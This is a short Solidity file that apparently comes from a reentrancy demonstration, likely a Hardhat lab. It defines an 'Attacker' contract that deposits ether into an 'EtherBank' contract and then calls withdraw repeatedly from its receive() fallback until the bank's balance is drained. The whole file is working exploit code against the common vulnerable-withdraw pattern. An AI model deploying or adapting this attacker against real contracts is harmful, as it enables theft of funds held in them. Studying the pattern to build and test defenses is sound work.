// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "hardhat/console.sol";

interface IEtherBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IEtherBank public etherBank;
    address private owner;

    constructor(address etherBankAddress) {
        etherBank = IEtherBank(etherBankAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        etherBank.deposit{value: msg.value}();
        etherBank.withdraw();
    }

    receive() external payable {
        if (address(etherBank).balance > 0) {
            console.log("reentering...");
            etherBank.withdraw();
        }
    }

}